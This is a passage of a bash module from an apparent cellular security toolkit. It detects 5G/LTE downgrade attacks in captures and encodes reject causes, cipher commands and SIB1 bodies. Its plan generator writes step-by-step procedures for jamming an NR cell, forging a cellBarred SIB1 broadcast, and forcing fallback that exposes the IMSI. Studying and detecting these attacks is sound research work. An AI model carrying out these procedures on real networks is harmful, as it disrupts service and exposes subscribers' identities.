    # Signal 4: the absence of a higher-RAT measurement after a change.
    local rats; rats=$(awk -F'\t' '{print toupper($2)}' "$work" | sort -u | tr '\n' ' ')

    printf 'file\t%s\n' "$(dwn_sanitize "$file")"
    printf 'records\t%s\n' "$records"
    printf 'rats_seen\t%s\n' "$(dwn_sanitize "$rats")"

    local n_steer n_rat n_cipher findings=0
    n_steer=$(printf '%s\n' "$steers" | grep -c . || true)
    n_rat=$(printf '%s\n' "$ratdown" | grep -c . || true)
    n_cipher=$(printf '%s\n' "$nullcipher" | grep -c . || true)
    printf 'steering_rejects\t%s\n' "$n_steer"
    printf 'rat_changes\t%s\n'      "$n_rat"
    printf 'null_ciphers\t%s\n'     "$n_cipher"

    if (( n_steer > 0 )); then
        findings=$(( findings + 1 ))
        printf 'finding\tsteering-reject\n'
        printf '%s\n' "$steers" | while IFS=$'\t' read -r ts rat ev det; do
            [[ -z "$ts" ]] && continue
            printf 'steering_reject\t%s\t%s\t%s\n' \
                "$(dwn_sanitize "$ts")" "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$det")"
        done
    fi
    if (( n_rat > 0 )); then
        findings=$(( findings + 1 ))
        printf 'finding\trat-downgrade\n'
        printf '%s\n' "$ratdown" | while IFS=$'\t' read -r ts rat ev det; do
            [[ -z "$ts" ]] && continue
            printf 'rat_change\t%s\t%s\t%s\n' \
                "$(dwn_sanitize "$ts")" "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$det")"
        done
    fi
    if (( n_cipher > 0 )); then
        findings=$(( findings + 1 ))
        printf 'finding\tnull-cipher\n'
        printf '%s\n' "$nullcipher" | while IFS=$'\t' read -r ts rat ev det; do
            [[ -z "$ts" ]] && continue
            printf 'null_cipher\t%s\t%s\t%s\n' \
                "$(dwn_sanitize "$ts")" "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$det")"
        done
    fi

    printf 'findings\t%s\n' "$findings"
    if (( findings >= 2 )); then
        printf 'verdict\tDOWNGRADE\n'
    elif (( findings == 1 )); then
        printf 'verdict\tSUSPECT\n'
    else
        printf 'verdict\tCLEAN\n'
    fi
}

# ── plan files ──────────────────────────────────────────────────────────
dwn_plan() {
    local name="${1:-}"
    local f="$DWN_PLAN_DIR/${name}.plan"
    mkdir -p "$DWN_PLAN_DIR" || { printf 'ERROR\tcannot create %s\n' "$DWN_PLAN_DIR" >&2; return 1; }
    local why="" need="" steps=""
    case "$name" in
        steer-down)
            why="A UE only leaves NR because something told it to. The cheap version is a Registration Reject with a steering cause; the UE then disables N1 and reselects LTE without the attacker needing to touch the radio."
            need="A 5G core that will emit an arbitrary 5GMM cause (an Open5GS AMF with a patched registration handler, or a test AMF), and a UE or a srsRAN UE simulator to register. No SDR is required for the reject itself."
            steps="1. Stand up the AMF and confirm a normal Registration Accept first, so the baseline is known.\n2. Patch the registration handler to reject with cause 27 (N1 mode not allowed).\n3. Register a UE and capture the NAS exchange on N1.\n4. Confirm the UE disables N1 mode and attempts an EPS Attach.\n5. Repeat with cause 31 (Redirection to EPC required) and compare the UE behaviour.\n6. Record the time from reject to EPS Attach — that is the downshift window."
            ;;
        jamming-suppress)
            why="Cell search is a physical-layer procedure with a signal-to-noise threshold. Raising the noise floor around the SSB makes the NR cell undiscoverable, and the UE reselects the strongest remaining RAT."
            need="A transmit-capable SDR — HackRF, BladeRF, USRP (B200/B210) or LimeSDR — with a suitable antenna, plus lawful authority for the band and power. An rtl-sdr cannot transmit."
            steps="1. Survey the NR cell: SSB ARFCN, GSCN and RSRP (module 12_nr_air.sh --arfcn / --ssb).\n2. Record the baseline RSRP and the serving LTE neighbour RSRP.\n3. Transmit band-limited noise centred on the SSB and raise power slowly.\n4. Watch for the NR measurement report to stop while LTE RSRP is unchanged.\n5. Observe the reselection to LTE and record the delay.\n6. Stop transmitting and confirm the UE returns to NR."
            ;;
        cs-fallback)
            why="A CS service with no IMS forces EPS Fallback, and the legacy RAN it lands on negotiates from a much weaker cipher set. This is where an IMSI becomes visible."
            need="A 2G or 3G radio access network reachable by the target UE (a lab femto, a test UTRAN/GERAN cell, or an operator network permitting roaming), plus a UE and a way to originate a CS call."
            steps="1. Confirm the target area has UTRAN/GERAN coverage the UE can select.\n2. Originate a mobile-originated CS call from the UE on the LTE/5G cell.\n3. Capture the S1/N2 release and the redirectedCarrierInfo pointing at UTRAN/GERAN.\n4. Capture the Location Updating Request on the legacy RAN.\n5. Look for an Identity Request with the IMSI identity type — that is the exposure.\n6. Record the cipher mode command and which A5/UEA algorithm was chosen."
            ;;
        forged-sib)
            why="A UE trusts the SIB it receives. SIB1 carries cellBarred, and a UE that reads cellBarred=barred on the NR cell treats it as unavailable and reselects the strongest remaining RAT — which is the downgrade, performed without touching the core network. Unlike jamming this is a valid-looking broadcast, so the UE reports no error."
            need="A transmit-capable SDR — HackRF, BladeRF, USRP (B200/B210) or LimeSDR — plus srsRAN or OpenAirInterface able to broadcast a modified SIB1, and lawful authority for the band. An rtl-sdr cannot transmit. The SIB1 body itself is built offline by $0 --build-sib1."
            steps="1. Survey the target NR cell: SSB ARFCN and GSCN ($0 --path, 12_nr_air.sh --arfcn / --ssb).\n2. Build the substitute SIB1 with the real PLMN, TAC and cellIdentity of that cell, and cellBarred set: $0 --build-sib1 <mcc> <mnc> <tac> <cellid> barred notAllowed.\n3. Confirm the body decodes back to those fields: 10_lte_air.sh --decode-sib 1 <body>.\n4. Patch the SIB1 into the srsRAN/OAI broadcast configuration and re-broadcast on the same cell identity.\n5. Watch the UE: cellBarred makes it consider the NR cell unavailable, so look for the reselection to LTE (or to 2G/3G).\n6. Record the time from the modified broadcast to the reselection — the downshift window.\n7. Stop the broadcast and confirm the UE returns to NR."
            ;;
        *) printf 'ERROR\tunknown plan: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib)\n' \
               "$(dwn_sanitize "$name")" >&2; return 2 ;;
    esac
    if ! cat > "$f" <<EOF
plan: ${name}
status: handoff
module: 15_downgrade.sh
generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)

what_this_is:
  A plan, not an executed attack. It names the hardware or testbed the
  vector needs and the steps to run it. The encodings this module performs
  offline (reject causes, Security Mode Command octets, the null-cipher
  table) are real and are not repeated here.

why:
  ${why}

testbed_required:
  ${need}

steps:
$(printf '%b' "  ${steps}" | sed 's/^/  /')

offline_encoders:
  $0 --reject-cause <n>
  $0 --build-security-mode <alg>
  $0 --build-sib1 <mcc> <mnc> <tac> <cellid> [barred|notBarred] [allowed|notAllowed]
  $0 --null-cipher-table

references:
  TS 24.301 9.9.3.9     EMM cause values
  TS 24.501 9.11.3.2    5GMM cause values
  TS 24.008 10.5.5.14   GMM cause values
  TS 33.501 5.5.2       NR ciphering and integrity algorithms
  TS 33.401 5.4.2       EPS ciphering and integrity algorithms
  TS 33.102 6.6         UMTS security algorithms
EOF
    then
        printf 'ERROR\tcannot write plan %s\n' "$f" >&2
        return 1
    fi
    printf 'plan\t%s\n'   "$f"
    printf 'name\t%s\n'   "$name"
    printf 'status\thandoff\n'
    printf 'testbed\t%s\n' "$(dwn_sanitize "$need")"
}

# ── hardware guards ─────────────────────────────────────────────────────
dwn_find_tx_sdr() {
    command -v hackrf_transfer >/dev/null 2>&1 && { echo "hackrf";  return 0; }
    command -v bladeRF-cli     >/dev/null 2>&1 && { echo "bladerf"; return 0; }
    command -v LimeUtil        >/dev/null 2>&1 && { echo "limesdr"; return 0; }
    command -v uhd_siggen      >/dev/null 2>&1 && { echo "usrp";    return 0; }
    return 1
}

dwn_find_gsm_stack() {
    local t
    for t in grgsm_scanner osmocon; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    return 1
}

dwn_find_capture_tool() {
    command -v tshark  >/dev/null 2>&1 && { echo "tshark";  return 0; }
    command -v tcpdump >/dev/null 2>&1 && { echo "tcpdump"; return 0; }
    return 1
}

dwn_status() {
    local tx stack cap
    tx=$(dwn_find_tx_sdr)        || tx="missing"
    stack=$(dwn_find_gsm_stack)  || stack="missing"
    cap=$(dwn_find_capture_tool) || cap="missing"
    printf 'tx_sdr\t%s\n'     "$tx"
    printf 'legacy_stack\t%s\n' "$stack"
    printf 'capture\t%s\n'    "$cap"
    printf 'causes\t%s\n'     "$(dwn_causes | grep -vc '^#')"
    printf 'null_ciphers\t%s\n' "$(dwn_null_ciphers | grep -vc '^#')"
    printf 'plans\t%s\n'      "$(ls -1 "$DWN_PLAN_DIR"/*.plan 2>/dev/null | wc -l)"
    printf 'dir\t%s\n'        "$DWN_DIR"
    printf 'plan_dir\t%s\n'   "$DWN_PLAN_DIR"
}

# ── CLI verbs ───────────────────────────────────────────────────────────
dwn_cli_status_tsv() { dwn_status; }

dwn_cmd_reject_cause() {
    local n="${1:-}" rat="${2:-}"
    [[ -n "$n" ]] || { printf 'ERROR\tusage: --reject-cause <n> [EMM|5GMM|GMM]\n' >&2; return 2; }
    [[ "$n" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tcause must be numeric: %s\n' "$(dwn_sanitize "$n")" >&2; return 2; }
    if [[ -n "$rat" ]]; then
        dwn_reject_encoding "${rat^^}" "$n"
        return $?
    fi
    # No RAT given: report the cause in every generation that defines it.
    local found=0
    local r
    for r in 5GMM EMM GMM; do
        if dwn_cause_row "$r" "$n" >/dev/null && [[ -n "$(dwn_cause_row "$r" "$n")" ]]; then
            dwn_reject_encoding "$r" "$n"
            found=$(( found + 1 ))
            printf 'separator\t---\n'
        fi
    done
    if (( found == 0 )); then
        printf 'ERROR\tcause %s is not an assigned reject cause in 5GMM, EMM or GMM\n' \
            "$(dwn_sanitize "$n")" >&2
        return 1
    fi
}

dwn_cmd_null_table() { dwn_null_table; }

dwn_cmd_build_smc() {
    local alg="${1:-}" a2="${2:-}" a3="${3:-}"
    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <cipher-alg> [integrity-alg] [NR|LTE|UMTS|GSM]\n' >&2; return 2; }
    dwn_build_security_mode "$alg" "$a2" "$a3"
}

dwn_cmd_detect() { dwn_detect "${1:-}"; }

dwn_cmd_plan() {
    local name="${1:-}"
    [[ -n "$name" ]] || {
        printf 'ERROR\tusage: --plan <steer-down|jamming-suppress|cs-fallback>\n' >&2; return 2; }
    dwn_plan "$name"
}

dwn_cmd_path() {
    local name="${1:-}"
    [[ -n "$name" ]] || {
        printf 'ERROR\tusage: --path <steer-down|jamming-suppress|cs-fallback>\n' >&2; return 2; }
    dwn_path "$name"
}

# ── selftest — no radio, no root, no network ────────────────────────────
dwn_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export TMP_DIR="$d/tmp" DWN_DIR="$d/loot/downgrade" DWN_PLAN_DIR="$d/loot/downgrade/plans"
    mkdir -p "$DWN_DIR" "$DWN_PLAN_DIR"

    # 1. Reject-cause lookup for the real assigned values.
    #    EMM (TS 24.301 9.9.3.9): 15 no suitable cells, 12 TA not allowed,
    #    13 roaming not allowed, 22 congestion, 7 EPS services not allowed.
    chk emm-15-name "$(dwn_cause_name EMM 15)" "No suitable cells in tracking area"
    chk emm-15-steer "$(dwn_cause_steering EMM 15)" "high"
    chk emm-12-name "$(dwn_cause_name EMM 12)" "Tracking area not allowed"
    chk emm-13-name "$(dwn_cause_name EMM 13)" "Roaming not allowed in this tracking area"
    chk emm-14-name "$(dwn_cause_name EMM 14)" "EPS services not allowed in this PLMN"
    chk emm-22-name "$(dwn_cause_name EMM 22)" "Congestion"
    chk emm-7-name  "$(dwn_cause_name EMM 7)"  "EPS services not allowed"
    chk emm-7-steer "$(dwn_cause_steering EMM 7)" "high"
    #    5GMM (TS 24.501 9.11.3.2): 27 N1 mode not allowed, 31 redirection to
    #    EPC required, 15 no suitable cells, 11 PLMN not allowed.
    chk gmm-27-name "$(dwn_cause_name 5GMM 27)" "N1 mode not allowed"
    chk gmm-27-steer "$(dwn_cause_steering 5GMM 27)" "high"
    chk gmm-31-name "$(dwn_cause_name 5GMM 31)" "Redirection to EPC required"
    chk gmm-15-name "$(dwn_cause_name 5GMM 15)" "No suitable cells in tracking area"
    chk gmm-11-name "$(dwn_cause_name 5GMM 11)" "PLMN not allowed"
    chk gmm-22-name "$(dwn_cause_name 5GMM 22)" "Congestion"
    chk gmm-72-name "$(dwn_cause_name 5GMM 72)" "Non-3GPP access to 5GCN not allowed"
    #    GMM (TS 24.008 10.5.5.14).
    chk gmm2-6-name "$(dwn_cause_name GMM 6)" "GPRS services not allowed"
    chk gmm2-13-name "$(dwn_cause_name GMM 13)" "Roaming not allowed in this location area"
    #    An unknown cause must be reported as unknown, never guessed.
    chk cause-unknown-rc "$(dwn_cmd_reject_cause 250 >/dev/null 2>&1; echo $?)" "1"
    chk cause-unknown-name "$(dwn_cause_name EMM 250)" ""
    chk cause-nonnum "$(dwn_cmd_reject_cause abc >/dev/null 2>&1; echo $?)" "2"
    chk cause-noargs "$(dwn_cmd_reject_cause >/dev/null 2>&1; echo $?)" "2"
    #    A cause that exists in one generation but not another.
    chk cause-27-emm "$(dwn_cause_row EMM 27)" ""
    chk cause-27-5gmm "$(dwn_cause_name 5GMM 27)" "N1 mode not allowed"

    # 2. The reject encoding: the cause IE and its octets.
    out=$(dwn_reject_encoding 5GMM 27)
    chk rej-rat     "$(fld "$out" rat)"        "5GMM"
    chk rej-cause   "$(fld "$out" cause)"      "27"
    chk rej-hex     "$(fld "$out" cause_hex)"  "1B"
    chk rej-ie      "$(fld "$out" cause_ie)"   "0x59"
    chk rej-octets  "$(fld "$out" ie_octets)"  "0x59 1B"
    chk rej-name    "$(fld "$out" name)"       "N1 mode not allowed"
    out=$(dwn_reject_encoding EMM 15)
    chk rej-emm-ie  "$(fld "$out" cause_ie)"   "0x53"
    chk rej-emm-hex "$(fld "$out" cause_hex)"  "0F"
    chk rej-emm-name "$(fld "$out" name)"      "No suitable cells in tracking area"
    out=$(dwn_reject_encoding GMM 12)
    chk rej-gmm-ie  "$(fld "$out" cause_ie)"   "0x13"
    chk rej-gmm-hex "$(fld "$out" cause_hex)"  "0C"
    chk rej-bad-rat "$(dwn_reject_encoding XYZ 1 >/dev/null 2>&1; echo $?)" "1"

    # 3. Null-cipher table completeness across all four generations.
    local tbl; tbl=$(dwn_null_table)
    chk null-hdr "$(printf '%s\n' "$tbl" | head -1)" "rat	alg	cipher	integrity	bits	exposes"
    # NR and LTE each define 4 algorithms (NEA/EEA 0..3); UMTS defines 3
    # (UEA 0..2 per TS 33.102 §6.6); GSM has A5/0 through A5/3.
    chk null-NR-count   "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="NR"'   | grep -c .)" "4"
    chk null-LTE-count  "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="LTE"'  | grep -c .)" "4"
    chk null-UMTS-count "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="UMTS"' | grep -c .)" "3"
    chk null-GSM-count  "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="GSM"'  | grep -c .)" "4"
    chk null-total "$(printf '%s\n' "$tbl" | tail -n +2 | grep -c .)" "15"
    #    The null algorithm of each generation, with the real numbers.
    chk null-nea0  "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="NEA0"{print $1}')" "NR"
    chk null-eea0  "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="EEA0"{print $1}')" "LTE"
    chk null-uea0  "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="UEA0"{print $1}')" "UMTS"
    chk null-a50   "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="A5/0"{print $1}')"  "GSM"
    chk null-a50-bits "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="A5/0"{print $5}')" "0"
    chk null-exposes "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="NEA0"{print $6}')" \
        "no confidentiality and no integrity on NAS and AS"
    # Each generation has exactly one "no ciphering" entry. GSM spells it
    # "no ciphering" rather than "null", so match the real row names.
    chk null-NR-detect   "$(dwn_null_for_rat NR   | grep -c 'NEA0')" "1"
    chk null-LTE-detect  "$(dwn_null_for_rat LTE  | grep -c 'EEA0')" "1"
    chk null-UMTS-detect "$(dwn_null_for_rat UMTS | grep -c 'UEA0')" "1"
    chk null-GSM-detect  "$(dwn_null_for_rat GSM  | grep -c 'A5/0')" "1"
    chk null-GSM-clear   "$(dwn_null_for_rat GSM  | grep -c 'in the clear')" "1"
    chk null-is-null-nea0 "$(dwn_is_null_alg NEA0 && echo yes || echo no)" "yes"
    chk null-is-null-eea0 "$(dwn_is_null_alg EEA0 && echo yes || echo no)" "yes"
    chk null-is-null-a50  "$(dwn_is_null_alg A5/0 && echo yes || echo no)" "yes"
    chk null-is-null-a51  "$(dwn_is_null_alg A5/1 && echo echo || echo no)" "no"
    chk null-is-null-nea2 "$(dwn_is_null_alg NEA2 && echo yes || echo no)" "no"

    # 4. Security-mode encoding, byte-exact.
    #    The octet is cipher_id (bits 8-5) | integrity_id (bits 4-1).
    #    NEA0/NIA0 -> 00, NEA2/NIA2 -> 22, EEA1/EIA1 -> 11, A5/1 -> 10.
    out=$(dwn_build_security_mode NEA0)
    chk smc-nea0-octet "$(fld "$out" smc_octet)" "00"
    chk smc-nea0-null  "$(fld "$out" null_algorithm)" "yes"
    chk smc-nea0-bits  "$(fld "$out" smc_bits)" "00000000"
    out=$(dwn_build_security_mode NEA2)
    chk smc-nea2-octet "$(fld "$out" smc_octet)" "22"
    chk smc-nea2-null  "$(fld "$out" null_algorithm)" "no"
    out=$(dwn_build_security_mode EEA1 LTE)
    chk smc-eea1-octet "$(fld "$out" smc_octet)" "11"
    chk smc-eea1-ciph  "$(fld "$out" cipher_id)"  "1"
    out=$(dwn_build_security_mode EEA0 LTE)
    chk smc-eea0-octet "$(fld "$out" smc_octet)" "00"
    chk smc-eea0-null  "$(fld "$out" null_algorithm)" "yes"
    out=$(dwn_build_security_mode UEA0 UMTS)
    chk smc-uea0-octet "$(fld "$out" smc_octet)" "00"
    out=$(dwn_build_security_mode UEA1 UMTS)
    chk smc-uea1-octet "$(fld "$out" smc_octet)" "11"
    #    A5/1 has no integrity algorithm, so the low nibble is zero.
    out=$(dwn_build_security_mode A5/1 GSM)
    chk smc-a51-octet  "$(fld "$out" smc_octet)" "10"
    chk smc-a51-integ  "$(fld "$out" integrity_id)" "0"
    chk smc-a51-nointeg "$(printf '%s\n' "$out" | grep -c 'integrity_available')" "1"
    out=$(dwn_build_security_mode A5/0 GSM)
    chk smc-a50-octet  "$(fld "$out" smc_octet)" "00"
    chk smc-a50-null   "$(fld "$out" null_algorithm)" "yes"
    chk smc-bad-alg    "$(dwn_build_security_mode WAT >/dev/null 2>&1; echo $?)" "2"
    chk smc-noargs     "$(dwn_build_security_mode >/dev/null 2>&1; echo $?)"     "2"
    #    The ciphering nibble must be the high one: a swap would still produce
    #    a plausible-looking octet, so pin the asymmetric case.
    out=$(dwn_build_security_mode NEA3)
    chk smc-nea3-octet "$(fld "$out" smc_octet)" "33"

    # 5. Downgrade detection against a synthetic record with all three
    #    signatures present.
    local cap="$d/capture.tsv"
    dwn_sample_capture > "$cap"
    out=$(dwn_detect "$cap")
    chk det-records  "$(fld "$out" records)"          "7"
    chk det-steers   "$(fld "$out" steering_rejects)" "1"
    chk det-rats     "$(fld "$out" rat_changes)"      "1"
    chk det-null     "$(fld "$out" null_ciphers)"     "1"
    chk det-findings "$(fld "$out" findings)"         "3"
    chk det-verdict  "$(fld "$out" verdict)"          "DOWNGRADE"
    chk det-f-steer  "$(printf '%s\n' "$out" | grep -c '^finding	steering-reject')" "1"
    chk det-f-rat    "$(printf '%s\n' "$out" | grep -c '^finding	rat-downgrade')"   "1"
    chk det-f-null   "$(printf '%s\n' "$out" | grep -c '^finding	null-cipher')"     "1"
    chk det-rats-seen "$(fld "$out" rats_seen)" "LTE NR "
    #    A clean capture: a normal 5G registration with a strong cipher.
    cat > "$cap" <<'EOF'
1	NR	attach	Registration Request imsi=208011234567890
2	NR	accept	Registration Accept
3	NR	cipher	cipher=NEA2 integrity=NIA2
4	NR	measurement	rsrp=-88 gscn=7915
EOF
    out=$(dwn_detect "$cap")
    chk clean-verdict "$(fld "$out" verdict)"   "CLEAN"
    chk clean-find    "$(fld "$out" findings)"  "0"
    chk clean-steers  "$(fld "$out" steering_rejects)" "0"
    #    A lone reject with no RAT change is SUSPECT, not DOWNGRADE.
    cat > "$cap" <<'EOF'
1	NR	reject	Registration Reject cause=15 name=No suitable cells in tracking area
2	NR	accept	Registration Accept
EOF
    out=$(dwn_detect "$cap")
    chk suspect-verdict "$(fld "$out" verdict)"  "SUSPECT"
    chk suspect-find    "$(fld "$out" findings)" "1"
    #    A non-steering reject must not be flagged.
    cat > "$cap" <<'EOF'
1	NR	reject	Registration Reject cause=22 name=Congestion
EOF
    out=$(dwn_detect "$cap")
    chk nonsteer-verdict "$(fld "$out" verdict)"  "CLEAN"
    chk nonsteer-steers  "$(fld "$out" steering_rejects)" "0"
    chk detect-missing "$(dwn_detect /nonexistent.tsv >/dev/null 2>&1; echo $?)" "1"
    chk detect-noargs  "$(dwn_detect >/dev/null 2>&1; echo $?)" "2"
    : > "$d/empty.tsv"
    chk detect-empty   "$(dwn_detect "$d/empty.tsv" >/dev/null 2>&1; echo $?)" "1"

    # 6. The four paths each describe a real mechanism.
    local p
    for p in steer-down jamming-suppress cs-fallback forged-sib; do
        out=$(dwn_path "$p")
        chk "path-$p-name"    "$(fld "$out" path)"   "$p"
        chk "path-$p-mech"    "$(printf '%s\n' "$out" | grep -c '^mechanism	')"  "1"
        chk "path-$p-ue"      "$(printf '%s\n' "$out" | grep -c '^ue_behaviour	')" "1"
        chk "path-$p-detect"  "$(printf '%s\n' "$out" | grep -c '^detect_by	')" "1"
    done
    chk path-steer-cause "$(dwn_path steer-down | grep -c 'N1 mode not allowed')" "1"
    chk path-cs-imsi     "$(dwn_path cs-fallback | grep -c 'imsi_exposure')"     "1"
    chk path-bad         "$(dwn_path nonsense >/dev/null 2>&1; echo $?)" "2"

    # 7. Plan files carry status: handoff and name the hardware.
    for p in steer-down jamming-suppress cs-fallback forged-sib; do
        out=$(dwn_plan "$p")
        chk "plan-$p-status"  "$(fld "$out" status)" "handoff"
        chk "plan-$p-file"    "$([[ -f "$DWN_PLAN_DIR/${p}.plan" ]] && echo yes || echo no)" "yes"
        chk "plan-$p-field"   "$(grep -c '^status: handoff$' "$DWN_PLAN_DIR/${p}.plan")" "1"
        chk "plan-$p-testbed" "$(grep -c '^testbed_required:' "$DWN_PLAN_DIR/${p}.plan")" "1"
        chk "plan-$p-steps"   "$(grep -c '^steps:' "$DWN_PLAN_DIR/${p}.plan")" "1"
        chk "plan-$p-nonempty" "$(awk '/^testbed_required:/{getline; if (length($0)>10) print "yes"; exit}' \
                                   "$DWN_PLAN_DIR/${p}.plan")" "yes"
    done
    chk plan-jam-radio "$(grep -c 'HackRF\|BladeRF\|USRP\|LimeSDR' "$DWN_PLAN_DIR/jamming-suppress.plan")" "1"
    chk plan-bad  "$(dwn_plan nonsense >/dev/null 2>&1; echo $?)" "2"
    chk plan-none "$(dwn_plan '' >/dev/null 2>&1; echo $?)"       "2"

    # 8. --build-sib1 encodes cellBarred. The body layout is the tree's own
    #    SIB1 convention, sliced exactly as 10_lte_air --decode-sib 1 reads it:
    #    PLMN 0:6 | TAC 6:2 + 8:2 | cellIdentity 10:7.
    chk sib1-plmn-2digit "$(dwn_encode_plmn 234 15)"  "32f451"
    chk sib1-plmn-3digit "$(dwn_encode_plmn 310 260)" "130062"
    local sib sib_body
    sib=$(dwn_build_sib1 234 15 4444 1234567 barred notAllowed)
    chk sib1-body    "$(fld "$sib" body)"        "32f451115c012d687"
    chk sib1-nibbles "$(fld "$sib" nibbles)"     "19"
    chk sib1-flags   "$(fld "$sib" flags_octet)" "c0"
    chk sib1-barred  "$(fld "$sib" cell_barred)" "barred"
    chk sib1-intra   "$(fld "$sib" intra_freq_reselection)" "notAllowed"
    sib_body=$(fld "$sib" body)
    chk sib1-slice-plmn   "${sib_body:0:6}" "$(dwn_encode_plmn 234 15)"
    chk sib1-slice-tac    "$(( 16#${sib_body:6:2} * 256 + 16#${sib_body:8:2} ))" "4444"
    chk sib1-slice-cellid "$(( 16#${sib_body:10:7} ))" "1234567"
    chk sib1-notbarred "$(fld "$(dwn_build_sib1 234 15 4444 1234567 notBarred allowed)" flags_octet)" "00"
    # A built SIB1 must say it is not TS 36.331 APER rather than imply it is.
    chk sib1-honest-encoding "$(printf '%s\n' "$sib" | grep -c 'NOT TS 36.331 APER')" "1"
    # Bad input must fail, never guess.
    chk sib1-bad-plmn   "$(dwn_build_sib1 12 15 >/dev/null 2>&1; echo $?)"          "1"
    chk sib1-bad-tac    "$(dwn_build_sib1 234 15 70000 0 >/dev/null 2>&1; echo $?)" "1"
    chk sib1-bad-cellid "$(dwn_build_sib1 234 15 1 268435456 >/dev/null 2>&1; echo $?)" "1"
    chk sib1-bad-barred "$(dwn_build_sib1 234 15 1 0 maybe >/dev/null 2>&1; echo $?)"   "1"
    chk sib1-bad-intra  "$(dwn_build_sib1 234 15 1 0 barred maybe >/dev/null 2>&1; echo $?)" "1"

    # 9. Verb validation returns non-zero and never prints a success line.
    chk cli-cause-noargs  "$(dwn_cmd_reject_cause >/dev/null 2>&1; echo $?)" "2"
    chk cli-cause-bad     "$(dwn_cmd_reject_cause xyz >/dev/null 2>&1; echo $?)" "2"
    chk cli-cause-unassigned "$(dwn_cmd_reject_cause 251 >/dev/null 2>&1; echo $?)" "1"
    chk cli-smc-noargs    "$(dwn_cmd_build_smc >/dev/null 2>&1; echo $?)" "2"
    chk cli-smc-bad       "$(dwn_cmd_build_smc NOPE >/dev/null 2>&1; echo $?)" "2"
    chk cli-detect-noargs "$(dwn_cmd_detect >/dev/null 2>&1; echo $?)" "2"
    chk cli-plan-bad      "$(dwn_cmd_plan nope >/dev/null 2>&1; echo $?)" "2"
    chk cli-sib1-bad-plmn "$(dwn_cli_main --build-sib1 12 15 >/dev/null 2>&1; echo $?)" "1"
    # The forged-sib plan must point at the real offline encoder, not stand alone.
    chk plan-forged-sib-encoder   "$(grep -c 'build-sib1' "$DWN_PLAN_DIR/forged-sib.plan" | awk '{print ($1>=1)?"yes":"no"}')" "yes"
    chk plan-forged-sib-cellbarred "$(grep -c 'cellBarred' "$DWN_PLAN_DIR/forged-sib.plan" | awk '{print ($1>=1)?"yes":"no"}')" "yes"
    chk cli-unknown       "$(dwn_cli_main --wat >/dev/null 2>&1; echo $?)" "2"

    # 10. Status TSV contract: the tables are always present.
    out=$(dwn_cli_status_tsv)
    chk status-dir      "$(fld "$out" dir)"      "$DWN_DIR"
    chk status-plandir  "$(fld "$out" plan_dir)" "$DWN_PLAN_DIR"
    chk status-causes   "$(fld "$out" causes | awk '{print ($1>=40)?"ok":"short"}')" "ok"
    chk status-nulls    "$(fld "$out" null_ciphers)" "15"
    chk status-keys     "$(printf '%s\n' "$out" | grep -c . | awk '{print ($1>=8)?"ok":"short"}')" "ok"

    # 11. TSV injection: a tab in an untrusted string must not forge a row.
    local evil
    evil=$(dwn_sanitize $'NR\tfake\trow\nmore')
    chk sanitize-tabs "$(printf '%s' "$evil" | awk -F'\t' '{print NF}')" "1"
    chk sanitize-nl   "$(printf '%s' "$evil" | grep -c .)" "1"

    # 12. pcap classification. A capture whose protocol info names a reject cause
    #     must actually raise the steering-reject signal. Guards the awk that turns
    #     tshark rows into records: it used to write a literal "event" into the
    #     event column, so all three detectors -- which key on that column -- could
    #     never fire and --detect answered CLEAN for every capture.
    if command -v tshark >/dev/null 2>&1 && command -v text2pcap >/dev/null 2>&1; then
        local hp="$d/reject.pcap"
        printf '0000 47 45 54 20 2f 72 65 6a 65 63 74 3f 63 61 75 73\n0010 65 3d 31 35 20 48 54 54 50 2f 31 2e 31 0d 0a\n' > "$d/hex.txt"
        if text2pcap -q -T 12345,80 "$d/hex.txt" "$hp" >/dev/null 2>&1; then
            out=$(bash "$0" --detect "$hp" 2>/dev/null)
            chk pcap-reject-raised "$(printf '%s\n' "$out" | awk -F'\t' '$1=="steering_rejects"{print $2}')" "1"
            chk pcap-verdict       "$(printf '%s\n' "$out" | awk -F'\t' '$1=="verdict"{print $2}')" "SUSPECT"
        else
            chk pcap-reject-raised "text2pcap-failed" "ok-or-skipped"
        fi
    else
        printf 'pcap-reject-raised\tSKIP (no tshark/text2pcap)\n'
    fi

    rm -rf "$d"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
dwn_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== downgrade attacks ===${C_RESET}"
        echo -e "  tx sdr: ${C_GRN}$(dwn_find_tx_sdr || echo 'missing (no transmit-capable SDR)')${C_RESET}"
        echo -e "  plans:  ${C_DIM}$DWN_PLAN_DIR${C_RESET}\n"
        cat << 'M'
  [1]  reject cause lookup
  [2]  null cipher table (all four generations)
  [3]  build a Security Mode Command
  [4]  detect a downgrade in a capture
  [5]  describe a downgrade path
  [6]  plan: steer down (5G -> 4G)
  [7]  plan: jamming suppression
  [8]  plan: CS fallback (-> 2G/3G)
